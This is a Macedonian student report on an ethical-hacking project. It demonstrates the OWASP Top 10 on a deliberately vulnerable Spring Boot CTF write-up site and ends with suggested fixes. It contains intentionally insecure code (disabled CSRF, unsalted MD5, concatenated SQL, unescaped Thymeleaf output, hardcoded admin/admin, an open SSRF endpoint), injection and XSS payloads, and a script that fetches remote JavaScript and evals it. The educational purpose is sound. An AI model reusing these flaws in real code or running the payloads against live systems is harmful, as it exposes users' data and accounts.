#### Проектна задача по Етичко хакирање
# Top 10 ранливости во Java базирана рамка за развој
Јован Симоноски 212005; Филип Џуклевски 215010;
### Вовед

За целта на оваа проектна задача одлучивме да работиме со веб апликација наменета за некој Capture the flag тим. Апликацијата служи за пишување и читање на write-up-и за CTF предизвици. Дополнително, на истата може да се излистаат членовите на тимот, да се читаат најновите вести од светот на сајбер безбедноста и слично. Постои и админ панел преку кој членовите на тимот може да менаџираат со соодветните write-up-и, категории, натпревари и слично.

Важно е да се напомене дека ова е функционална веб апликација од која направивме ранлива верзија за да може посоодветно (скоро реално) да се демострираат ранливостите.

### Потребен хардвер и софтвер

Оваа тема нема некои посебни побарувања за хардер. Можеби доколку сакаме целосно реална околина, веб апликацијата би можела да биде покрената на веб сервер кој е достапен на интернет. За целите на проектот, користевме локален Tomcat веб сервер и Postgres база на податоци. За демонстрирање на нападите користевме Kali Linux виртуелна машина, BurpSuite, Postman, CrackStation и други.

### OWASP Top 10

##### A01:2021-Broken Access Control

Оваа апликација во однос на контролата на приста е ранлива на добро познатиот CSRF напад. Оваа ранливост произлегува од недостатокот на CSRF токени во самата логика на апликацијата. Нападот одлучивме да го демострираме преку креирање на нова категорија со помош на малициозен код кој е хостиран на трет веб сервер.

Sprinng Security вообичаено користи заштита од CSRF, па дури и не е лесно да се направи една апликација да биде ранлива на истото. Потребно е експлицитно да ја оневозможиме оваа заштита. Кодот кој доведува до оваа ранливост е:
```java
@Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .csrf(AbstractHttpConfigurer::disable)
                ...
    }
```
![Image](https://github.com/user-attachments/assets/82678a85-23eb-49c0-926f-2f79f3c20862)
![Image](https://github.com/user-attachments/assets/b500eaf7-2ba2-47f8-9ad1-e4f4a5a54b39)


##### A02:2021-Cryptographic Failures
За целите на оваа ранливост ќе користиме слабост во застарениот алгоритам за шифрирање на лозинки наречен MD5 (Message-Digest 5). Ќе симулираме напад врз алгоритмот кој што генерира 128-битна хеш вредност која е ранлива на brute-force напади и rainbow табели напади.
Најпрво ни е потребна таблета од базата која што ги содрши хешираните лозинки, која што ја користи веб-апликацијата. Ова може да се постигни со алатки како hashcat и John the Ripper кои што се преинсталирани на Kali Linux или готова табела со најкористените лозинки во нивна хеш вредност. Ова може да работи затоа што не се користи посолување на лозинките и една порака секогаш ја генерира истата хеш вредност. Да претпоставиме дека веќе имаме пристап до табелата со лозинки и излгеда сличо како на сликата.

<img width="468" alt="Image" src="https://github.com/user-attachments/assets/f687f073-2238-4664-9f81-88c0e3391466" />

Тука може да се видат лозинките, но внесувањето на овие вредности нема да ни овозможи пристап. Но, ако ги земеме овие хеш вредности и им ги предадеме на алгоритам за дешифрирање на MD5 ќе добиеме преглед на нешифрираната верзија на лозинката. За да го постигнеме ова може да користиме готова веб страна како crackstation.net.

![Image](https://github.com/user-attachments/assets/02c5041a-2b59-4589-ac05-574aadbc3277)

Кодот кој се користи за употреба на MD5 хеширање:
```java
public class MD5PasswordEncoder implements PasswordEncoder {
    public MD5PasswordEncoder() {
        System.out.println("[MD5PasswordEncoder] instantiated");
    }

    @Override
    public String encode(CharSequence rawPassword) {
        System.out.println("[MD5PasswordEncoder] encode() rawPassword=" + rawPassword);
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(rawPassword.toString().getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public boolean matches(CharSequence rawPassword, String encodedPassword) {
        System.out.println("[MD5PasswordEncoder] matches() raw=" + rawPassword + " encoded=" + encodedPassword);
        return encode(rawPassword).equals(encodedPassword);
    }
}
```
##### A03:2021-Injection

Недостатоци на инјектирање се јавуваат кога недоверлив влез е вграден директно во командата или барањето. Во случајов имаме:
·       SQL инјекција во функционалноста „пребарување“ за категории и настани, каде што корисничкиот влез е споен во матична SQL - ова клаузула.
·       Зачуван XSS во формуларот за креирање категорија, каде што злонамерната ознака <script> зачувана во базата на податоци подоцна се прикажува без избегнување во листата на категории.

1 -      SQL Injection
SQL injection нападот ке се изведува во Categories делиот од веб-апликацијата каде во самата форма за пребарување на категории ке го извршиме нападот. Наместо термини за пребарување во формата ке внесиме SQL query во форма на:   ' OR '1'='1 . Оваа инјекција доведува до прикажување на овој запис над самата форма за пребарување.

Кодот поради кој се појавува ранливоста:
```java
@Override
    public List<Category> searchUnsafe(String query) {
        String sql = "SELECT * FROM category WHERE name LIKE '%" + query + "%'";
        return entityManager.createNativeQuery(sql, Category.class).getResultList();
    }
```
![Image](https://github.com/user-attachments/assets/2dedd351-caf1-4b22-b38c-c31a5e4d3806)

2 -      XSS
За демонстрирање на овој напад, најпрво треба да ја пристапиме страната за креирање на нова категорија на адрсата http://localhost:8080/admin/categories/create каде во полето за внесување на име на категорија, ние ја внесуваме малициозната скрипта во формат "<script>alert("primer")</script>". После „креирање“ на категорија со ова име, се појавува порака на екранот во форма на известување како на сликата со истата порака која сме ја напишале во делот “primer” во нашиот случај.

Причината поради која се појавува оваа ранливост е многу едноставна и тоа е заплашувачки. Се што треба да направиме за да се појави XSS кај Thymeleaf е да искористиме
```html
                <td th:utext="${category.name}"></td>
```
наместо
```html
                <td th:text="${category.name}"></td>
```

<img width="468" alt="Image" src="https://github.com/user-attachments/assets/0af7cf28-4985-4c6c-b378-7b97b6a1563b" />

##### A04:2021-Insecure Design

Бидејќи оваа апликација служи за пришување и читање на write-up-и за CTF предизвици, постојат активни CTF натпревари за кои не смее да се објавуваат решенија. За таа цел апликацијата имплементира логика која ги сокрива решенијата за моментално активни натпревари со тоа што го споредува моменталниот датум со датумот на кој завршува натпреварот. Но, сликите кои се користат во самите решенија се индексирани на предефинирани патеки и истите имаат генерички имиња (1,2,3...). Доколку напаѓачот успее да ја реконструира целосната патека до дадена слика која припаѓа на необјавен write-up, може да добие пристап до истата и да открие дел од решението.

![Image](https://github.com/user-attachments/assets/a6a01942-da02-473b-944d-0da9ef502e51)

##### A05:2021-Security Misconfiguration

Ова сценарио покажува како напаѓачот може да добие неовластен административен пристап до веб-апликација базирана на Java со искористување на стандардните креденцијали (admin / admin). Овие креденцијали останале непроменети по нивно креирање - вообичаен пропуст што овозможува тривијално компромитирање на системот.
Откако ќе ја пристапиме веб-апликацијата во веб пребарувач (како Firefox) на адресата http://localhost:8080/login и како креденцијали внесиме admin / admin ни овозможува неовластен пристап користејќи ги стандардните креденцијали. Ова сценарио ни покажува како многу лесно може да се направи основна почетничка грешка при креирање на администраторски корисници со големи последици.
Пример за ова е заборавени креденцијали во HTML:

```html
<section class="hero-section">
    <div class="container text-center">
        <h1 class="fw-bold">Welcome to <span class="highlight">UKIM CTF</span></h1>
        <p class="lead">We are a team of ethical hackers competing in CTF challenges.</p>
        <img src="/images/finki.png" alt="Logo" class="logo">
    </div>
    <!-- FOR TESTING ONLY!!! -->
    <!-- Username: admin -->
    <!-- Password: admin -->
</section>
```

##### A06:2021-Vulnerable and Outdated Components
Нашата апликација во делот 'categories' нуди можност за пребарување на категории. Интересно е тоа што текстот по кој се пребарува се испишува на самата страница со помош на jQuery 1.6.4. Оваа библиотека има позната ранливост на XSS, па затаа цел имплементиавме DOM-Based XSS. Конкретниот дел од кодот кој е ранлив е следниот:
```js
$(function () {
      var userInput = decodeURIComponent(location.search.slice(7));
      $('#content').html(userInput);
    });
```
![Image](https://github.com/user-attachments/assets/3508882d-7dde-484c-a134-637acd46cfe9)

![Image](https://github.com/user-attachments/assets/deaf22ca-d5be-4a16-8bec-bf06f81ea730)


##### A07:2021-Identification and Authentication Failures
Ранливоста која се појавува во нашата апликација е можноста да се изведе dictionary или brute force напад со тоа што не е импламентиран систем за CAPTCHA или блокирање на пристап после одреден број на неупешни обиди за автентикација.

##### A08:2021-Software and Data Integrity Failures
За да ја направиме апликацијата ранлива во овој аспект, додадовме дел во кој апликацијата до самиот frontend прави fetch на предефинирана скрипта и ја извршува истата без притоа да го провери интегритетот на скриптата или пак изворот. Доколку настане supply chain poisoning или слично сценарио, апликацијата станува ранлива на овој тип на напад.

При посета на страната се појавува JavaScript alert() известување со пораката: „Pwned by untrusted script!“, позадината се менува во црна и конзолата на прелистувачот ќе ги евидентира колачињата за сесија.

```js
<script>
    fetch("https://raw.githubusercontent.com/Dzhuklevski/untrusted-js-demo/refs/heads/master/malicious.js")
        .then(response => response.text())
        .then(code => eval(code));
</script>
```

<img width="468" alt="Image" src="https://github.com/user-attachments/assets/fda73f81-9d7a-414e-a6ec-24a924d0ceb9" />


##### A09:2021-Security Logging and Monitoring Failures
Ранливоста која сакавме да ја прикажеме во однос на оваа точка е се-почестиот недостаток на логирање и мониторирање на акциите кои се случуваат врз апликацијата. На пример, во конкретниот случај апликацијата нема никакво мониторирање и логирање, па според тоа не би можело да се забележи некаков напад (најчесто).

За таа цел го имплементиравме следниот едноставен систем за мониторирање:
```java
@Bean
    public AuthenticationFailureHandler customAuthenticationFailureHandler() {
        return new AuthenticationFailureHandler() {
            @Override
            public void onAuthenticationFailure(HttpServletRequest request,
                                                HttpServletResponse response,
                                                AuthenticationException exception) throws IOException, ServletException {
                String username = request.getParameter("username");
                String ip = request.getRemoteAddr();
                logger.warning("Failed login attempt for user: " + username + " from IP: " + ip);
                response.sendRedirect("/login?error");
            }
        };
    }
```
Пример за log кој го добиваме:
```
2025-06-12T00:19:58.406+02:00  WARN 9770 --- [ukim-ctf-website-vulnerable] [io-8080-exec-10] m.u.f.w.u.config.SecurityConfig          : Failed login attempt for user: admin from IP: 0:0:0:0:0:0:0:1
```
##### A10:2021-Server-Side Request Forgery

Оваа ранливост ја имплементиравме во делот 'news'. Имено, поголемиот дел од процесот се случува на frontend со тоа што имаме JavaScript кој испраќа POST барање до серверот во кое е наведено соодветното URL од кое треба да се преземат најновите вести. Во ова URL динамички се додава соодветното ID според кое се влечат вести од предефинираното API. Тоа може да се види во следната функција:
```js
const stories = await Promise.all(
                storyIds.slice(0, 12).map(async id => {
                    const storyResponse = await fetch('/api/news/fetch', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            url: `https://hacker-news.firebaseio.com/v0/item/${id}.json`
                        })
                    });
                    return await storyResponse.json();
                })
            );
```
Потоа, серверот само испраќа барање до даденото URL и го враќа резултатот на frontend.

Тоа се случува со помош на следниот код:
```java
@PostMapping("/fetch")
    public ResponseEntity<String> fetchNews(@RequestBody Map<String, String> request) {
        try {
            String url = request.get("url");
            String response = restTemplate.getForObject(url, String.class);
            return ResponseEntity.ok(response);
        } catch (Exception e) {
            return ResponseEntity.internalServerError().body("Error fetching data: " + e.getMessage());
        }
    }
```

Ранливоста тука е тоа што напаѓачите може да го пресретнат ова барање со помош на алатка како Postman Interceptr, Burp Suite и слично и да го модифицираат телото на POST барањето со ново, малициозно URL до кое серверот ќе испрати барање.

За да го демострираме овој напад, подигнавме едноставен http сервер локално и го модифициравме URL-то на барањето да одговара на овој сервер, па со испраќање на модифицираното барање, може да забележиме дека стигнува и барање до новиот сервер од страна на нашата ранлива веб апликација.

![Image](https://github.com/user-attachments/assets/4ecbc85e-61ab-46d3-8a49-140f004df227)

![Image](https://github.com/user-attachments/assets/4ea42833-9f59-439e-a80d-f46b3c580ed6)

![Image](https://github.com/user-attachments/assets/4df9c2bd-be92-434b-8dfc-18818596520a)


### Заклучок

Како дел од заклучокот ќе разгледаме некои предлози за тоа како може да се избегнат овие ранливости.

##### A01:2021 – Broken Access Control
Spring Security има вградена заштита од CSRF. Доколку работиме со некој друг framework, може да конфигурираме CSRF токени кои најдобро може да се справат со оваа ранливост.

##### A02:2021 – Cryptographic Failures
За да ја корегираме оваа ранливост потребно е да користиме безбедни алгоритми, а најважно од се е да користиме готови, добро познати имплементации бидејќи најчестите и најфатални ранливости од овој аспект доаѓаат од custom имплементации на одредени алгоритми или протоколи.

##### A03:2021 – Injection
Во однос на SQL инјекцијата, доколку ја користиме Springboot рамката која го нуди JpaRepository можеме во огромна мера да ја обезбедиме апликацијата од ваков тип на напади. Во најголем дел од случаите JpaRepository е соодветен, а доколку пак имаме конкретна потреба рачно да напишеме некое query, потребно е да направиме санитизација на корисничкиот input.
Во однос на XSS, доколку направевме соодветна санитизација на корисничкиот input или искористевме th:text, што го прави тоа за нас, апликацијата ќе беше безбедна.

##### A04:2021 – Insecure Design

Конкретната ранливост која ја имавме може да се закрпи со поставување на случајно генерирани имиња на слики. На пример добра пракса би било да поставуваме некоја hash вредност за да биде скоро невозможно случајно да ја погодиме истата вредност.

##### A05:2021 – Security Misconfiguration

Оваа ранливост иако изгледа многу едноставна, сепак е многу застапена. За заштита, потребна е детална анализа на кодот кој се пушта во продукција.

##### A06:2021 – Vulnerable and Outdated Components
За заштита од ранливи и застарени компоненти, денес постојат голем број на алатки кои може да ни помогнат. Една таква алатка е Github Dependabot која постојано не ивестува доколку имаме некоја ранлива или застарена компонента. Постојаното и навремено ажурирање е клучен чекор во заштитата од оваа ранливост.

##### A07:2021 – Identification and Authentication Failures
Како заштита од оваа ранливост може да се имплементира систем кој потенцијално би го овозможувал пристапот на корисници кои надминуваат одреден број на неуспешни обиди за најавување во одредена единица време. Поставување на CAPTCHA би било одлично дополнително ниво на заштита.

##### A08:2021 – Software and Data Integrity Failures
Постојаното проверување на софтверот кој го користиме од third parties е клучен чекор за заштита од оваа ранливост. Потребно е да имаме сигурен извор на hash signatures за даден софтвер, со цел да може да го проверуваме неговиот интегритет.

##### A09:2021 – Security Logging and Monitoring Failures

Конкретната ранливост кој ја имавме може да се заобиколи со креирање на logging систем.
За таа цел го имплементиравме следниот едноставен систем за мониторирање:
```java
@Bean
    public AuthenticationFailureHandler customAuthenticationFailureHandler() {
        return new AuthenticationFailureHandler() {
            @Override
            public void onAuthenticationFailure(HttpServletRequest request,
                                                HttpServletResponse response,
                                                AuthenticationException exception) throws IOException, ServletException {
                String username = request.getParameter("username");
                String ip = request.getRemoteAddr();
                logger.warning("Failed login attempt for user: " + username + " from IP: " + ip);
                response.sendRedirect("/login?error");
            }
        };
    }
```
Пример за log кој го добиваме:
```
2025-06-12T00:19:58.406+02:00  WARN 9770 --- [ukim-ctf-website-vulnerable] [io-8080-exec-10] m.u.f.w.u.config.SecurityConfig          : Failed login attempt for user: admin from IP: 0:0:0:0:0:0:0:1
```

##### A10:2021 – Server-Side Request Forgery

Оваа ранливост произлегува од тоа што најпрвин url-то од кое треба да се влечат податоци се испраќа од клиентска страна кон серверот. А потоа, од тоа што на серверот нема соодветна проверка пред да се испрати барањето. Тоа би можело да се закрпи на следниов начин на серверска страна:
```java
if (url == null || !url.startsWith("https://hacker-news.firebaseio.com/")) {
            return ResponseEntity.badRequest().body("Invalid URL");
        }
```

Безбедна верзија на кодот без ранливости (би требало да биде без ранливости :D )
https://github.com/JovanSimonoski/ukim-ctf-website



















